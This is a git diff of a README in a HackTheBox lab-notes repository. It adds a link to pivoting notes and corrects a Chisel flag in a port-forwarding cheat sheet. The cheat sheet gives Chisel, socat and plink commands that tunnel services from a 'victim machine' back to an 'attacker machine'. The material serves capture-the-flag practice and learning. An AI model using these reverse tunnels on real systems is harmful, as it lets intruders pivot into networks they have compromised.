@@ -29,6 +29,7 @@ created & maintained by: **cyberwr3nch**
 | [Web Attacks](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/WebAttacks.md) | sql-injection, login bruteforce( wfuzz, hydra) |
 | [Docker Commands](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Docker%20Commands.md) | installation, building, pulling, updating, deleting, listing, cheatsheet |
 | [Git Commands](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Git%20Commands.md) | clone, commit, push, pull, add, log, deleted file, checkout | 
+| [Pivoting](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Pivoting.md) | POST Exploitation, Pivoting, Chisel |
 
 
 ### Tools <a name='tools'></a>
@@ -47,7 +48,7 @@ created & maintained by: **cyberwr3nch**
 #### Port Forwarding
 | Tool | Use | Command Syntax|
 | ---- | --- | -------------- |
-| [Chisel](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/chisel) | Used to forward a service running on a port in the victim machine | `./chisel server -p <port no.> --revserse` = on the attacker machine <br /> `./chisel client <attackerip:port> R:1234:127.0.0.1:1121` = Forwards the service running on port 1121 to the port 1234 on attackers machine |
+| [Chisel](https://github.com/cyberwr3nch/hackthebox/tree/master/tools/chisel) | Used to forward a service running on a port in the victim machine | `./chisel server -p <port no.> --reverse` = on the attacker machine <br /> `./chisel client <attackerip:port> R:1234:127.0.0.1:1121` = Forwards the service running on port 1121 to the port 1234 on attackers machine |
 | [socat](https://github.com/craSH/socat) | Swiss Knife for Port forwarding | `socat TCP-LISTEN:8000,fork TCP:<machineIP>:<port>` = Listens on every connection to port `8000` and forwards to the `machineIP` and its `port` <br /> `socat TCP-LISTEN:9002,bind=<specific ip>,fork,reuseaddr TCP:localhost:<port>` = forward all incoming requests to the port 9002 from <specific ip> to the localhost port, reuseaddr is used to specify socat use the address (eg. localhost) even if its used by other services|
 | [plink](https://github.com/Plotkine/pentesting/blob/master/Windows_privilege_escalation/Windows-privesc-tib3rius/plink.exe) | SSH Putty in CLI mode | `.\plink.exe <user@host> -R <remote port>:<localhost>:<local port>` .\plink.exe kali@10.10.14.32 -R 8888:127.0.0.1:8888 = port forwards the service running on victim machines port 8888 to the attacker machines 8888 |
 
